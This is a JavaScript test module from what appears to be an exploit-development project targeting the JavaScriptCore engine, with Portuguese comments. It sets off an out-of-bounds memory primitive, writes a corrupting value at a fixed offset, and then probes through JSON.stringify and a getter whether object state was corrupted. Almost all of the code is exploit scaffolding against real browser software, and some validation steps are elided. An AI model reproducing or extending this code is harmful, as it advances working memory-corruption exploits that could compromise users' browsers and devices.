// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForPreCheck";
let getter_called_flag = false;
let current_test_results = { success: false, message: "Teste não iniciado.", error: null, pre_getter_state: null, in_getter_state: null };

const CORRUPTION_OFFSET = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

// Variável para armazenar o estado do checkpoint_obj ANTES do JSON.stringify
let checkpoint_obj_state_before_stringify;

class CheckpointForPreCheck {
    constructor(id) {
        this.id_marker = `PreCheckCheckpoint-${id}`;
        this.data_val = 0x12345678;
        this.arr_val = [1, 2, 3];
        this.obj_val = { a: 1 };
    }

    captureState() {
        // Captura um snapshot simples do estado do objeto
        try {
            return {
                id_marker: this.id_marker,
                data_val: this.data_val,
                arr_val_json: JSON.stringify(this.arr_val), // Comparar JSON para arrays/objetos simples
                obj_val_json: JSON.stringify(this.obj_val),
                arr_val_length: this.arr_val ? this.arr_val.length : 'null'
            };
        } catch (e) {
            return { error_capturing_state: e.message };
        }
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "PreCheck_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        current_test_results.in_getter_state = this.captureState();
        logS3(`Estado de 'this' DENTRO DO GETTER: ${JSON.stringify(current_test_results.in_getter_state)}`, "info", FNAME_GETTER);

        // Comparar com o estado pré-getter
        if (checkpoint_obj_state_before_stringify && current_test_results.in_getter_state) {
            if (JSON.stringify(checkpoint_obj_state_before_stringify) !== JSON.stringify(current_test_results.in_getter_state)) {
                logS3("ALTERAÇÃO DETECTADA! Estado do checkpoint_obj mudou entre antes e dentro do getter!", "vuln", FNAME_GETTER);
                current_test_results.success = true;
                current_test_results.message = "Estado do checkpoint_obj alterado antes/dentro do getter.";
            } else {
                current_test_results.message = "Nenhuma alteração óbvia no estado do checkpoint_obj (antes vs. dentro do getter).";
            }
        } else {
            current_test_results.message = "Não foi possível comparar estado antes/dentro do getter.";
        }
        return 0xBADF00D;
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForPreCheck.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
        // eslint-disable-next-line no-unused-vars
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { id: this.id_marker, processed_by_precheck_test: true };
    }
}

export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
    const FNAME_TEST = "executePreGetterStateCheckTest"; // Nome interno
    logS3(`--- Iniciando Teste de Verificação de Estado Pré-Getter ---`, "test", FNAME_TEST);

    getter_called_flag = false;
    checkpoint_obj_state_before_stringify = null;
    current_test_results = { success: false, message: "Teste não executado.", error: null, pre_getter_state: null, in_getter_state: null };

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { /* ... validação ... */ return; }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { /* ... erro ... */ return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);

        // 1. Criar o objeto Checkpoint
        const checkpoint_obj_for_precheck = new CheckpointForPreCheck(1);
        logS3(`CheckpointForPreCheck objeto criado. ID: ${checkpoint_obj_for_precheck.id_marker}`, "info", FNAME_TEST);

        // 2. Capturar estado ANTES da escrita OOB e JSON.stringify
        checkpoint_obj_state_before_stringify = checkpoint_obj_for_precheck.captureState();
        logS3(`Estado do checkpoint_obj ANTES da escrita OOB/stringify: ${JSON.stringify(checkpoint_obj_state_before_stringify)}`, "info", FNAME_TEST);
        current_test_results.pre_getter_state = checkpoint_obj_state_before_stringify;

        // 3. Realizar a escrita OOB "gatilho"
        oob_write_absolute(CORRUPTION_OFFSET, CORRUPTION_VALUE, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET)} do oob_data completada.`, "info", FNAME_TEST);
        
        // 4. Chamar JSON.stringify
        logS3(`Chamando JSON.stringify(checkpoint_obj_for_precheck)...`, "info", FNAME_TEST);
        let stringify_result = null;
        try {
            stringify_result = JSON.stringify(checkpoint_obj_for_precheck);
            logS3(`JSON.stringify completado. Resultado: ${stringify_result}`, "info", FNAME_TEST);
        } catch (e) {
            logS3(`Erro JSON.stringify: ${e.message}`, "error", FNAME_TEST);
             if (!getter_called_flag) { current_test_results.message = `Erro em JSON.stringify antes do getter: ${e.message}`; current_test_results.error = String(e); }
        }

    } catch (mainError) {
        logS3(`Erro principal: ${mainError.message}`, "critical", FNAME_TEST);
        console.error(mainError);
        current_test_results = { success: false, message: `Erro crítico: ${mainError.message}`, error: String(mainError) };
    } finally {
        logS3("Limpeza finalizada.", "info", "CleanupFinal");
    }

    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE PRÉ-GETTER: SUCESSO! ${current_test_results.message}`, "vuln", FNAME_TEST);
        } else {
            logS3(`RESULTADO TESTE PRÉ-GETTER: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST);
        }
        logS3(`  Estado Pré-Getter: ${JSON.stringify(current_test_results.pre_getter_state)}`, "info", FNAME_TEST);
        logS3(`  Estado No Getter:    ${JSON.stringify(current_test_results.in_getter_state)}`, "info", FNAME_TEST);
    } else {
        logS3("RESULTADO TESTE PRÉ-GETTER: Getter NÃO foi chamado.", "error", FNAME_TEST);
    }
    // logS3(`  Detalhes finais JSON: ${JSON.stringify(current_test_results)}`, "info", FNAME_TEST);

    clearOOBEnvironment();
    logS3(`--- Teste de Verificação de Estado Pré-Getter Concluído ---`, "test", FNAME_TEST);
}
